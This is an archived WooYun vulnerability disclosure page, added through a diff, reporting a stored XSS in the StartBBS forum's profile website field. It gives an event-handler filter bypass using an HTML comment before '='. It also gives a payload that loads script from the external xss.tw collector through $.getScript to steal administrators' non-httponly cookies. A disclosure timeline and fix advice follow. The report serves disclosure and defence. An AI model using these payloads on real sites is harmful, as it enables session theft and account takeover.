@@ -1,0 +1,231 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		startbbs开源论坛存储型xss可盲打管理员  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		startbbs开源论坛存储型xss可盲打管理员  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/梧桐雨">梧桐雨</a> 
+</li><li>提交时间：		2013-12-18 22:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-23：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-03-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">startbbs某处对用户输出过滤不当导致存储型xss</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">startbbs 采用mvc架构设计。但是在对用户个人资料输入输出过滤不当，导致跨站脚本攻击。<br />
+<br />
+<br />
+<br />
+1、目标定位在：<br />
+<br />
+</p><p class="detail"><a href="../images/1811574106e622c5e6845ef92eb6970c3f14a337.jpg" target="_blank"><img src="../images/1811574106e622c5e6845ef92eb6970c3f14a337.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+多个用户可以输入的地方，我拿个人网站输入的地方做测试。<br />
+<br />
+先输入&quot; onmouseover=alert(1)<br />
+<br />
+发现被过滤成：<br />
+<br />
+</p><p class="detail"><a href="../images/181159186e57a6da7164bc16f9b200b57be7b5b7.jpg" target="_blank"><img src="../images/181159186e57a6da7164bc16f9b200b57be7b5b7.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+经过测试之后，发现凡是带了onxx的，等号都会被过滤。<br />
+<br />
+<br />
+<br />
+这个时候是不是就没办法了呢？非也非也。<br />
+<br />
+经过fuzz之后，发现可以这么绕过：<br />
+<br />
+onmouseover&lt;!----&gt;=&quot;alert(1)//<br />
+<br />
+</p><p class="detail"><a href="../images/18120835236733c88bf4b18ab026837524dce305.jpg" target="_blank"><img src="../images/18120835236733c88bf4b18ab026837524dce305.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+解释下：因为在html里头是用&lt;!----&gt;注释的，刚刚好，这里没有过滤&lt;&gt;字符。因此可以这么绕过。<br />
+<br />
+<br />
+<br />
+但是最后在加载js的时候，发现事实远远没有我想的那么简单。<br />
+<br />
+万恶的竟然控制了长度，这个时候就不能用onmouseover，只能采用onclick。<br />
+<br />
+而因为站点采用了jq，因此我们可以这么写<br />
+<br />
+&quot;onclick&lt;!----&gt;=$.getScript(&#039;http://xss.tw/5524&#039;)<br />
+<br />
+最后问题又来了，我们发现这么写不能触发，原因是多了一个双引号：<br />
+<br />
+</p><p class="detail"><a href="../images/181203525659e04c0f38ed49938bcc687e42609f.jpg" target="_blank"><img src="../images/181203525659e04c0f38ed49938bcc687e42609f.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+非常有意思，我们可以在 $.getScript之前加一个&quot;闭合他。<br />
+<br />
+&quot;onclick&lt;!----&gt;=&quot;$.getScript(&#039;http://xss.tw/5524&#039;)<br />
+<br />
+<br />
+<br />
+最后用户点击了我的个人网站之后，就会变成：<br />
+<br />
+</p><p class="detail"><a href="../images/1812050493a7d06b2ae806c375dcea4b989491d6.jpg" target="_blank"><img src="../images/1812050493a7d06b2ae806c375dcea4b989491d6.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+可能这里有一个疑问，为什么获取不了数据？<br />
+<br />
+因为最近xss.tw平台cookie数据爆满了，无论是什么数据都会显示为空。。很悲催- -<br />
+<br />
+<br />
+<br />
+我们可以看看自己的cookie，是没有httponly的：<br />
+<br />
+<br />
+<br />
+证实一下：<br />
+<br />
+</p><p class="detail"><a href="../images/18120620c6848582a938455fc146f610f888f18e.jpg" target="_blank"><img src="../images/18120620c6848582a938455fc146f610f888f18e.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上面已经写清楚了。。<br />
+<br />
+<br />
+<br />
+虽然最后因为xss.tw的原因没有拿到cookie登陆，但是已经证明可以通过这样的方式引入js，并且cookie键值没加httponly，是可以盲打管理员的。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">仔细检查下用户输入与输出。白名单过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/梧桐雨" title="梧桐雨">梧桐雨</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046334" title="startbbs开源论坛存储型xss可盲打管理员">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-12-23 22:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：5 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46334";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
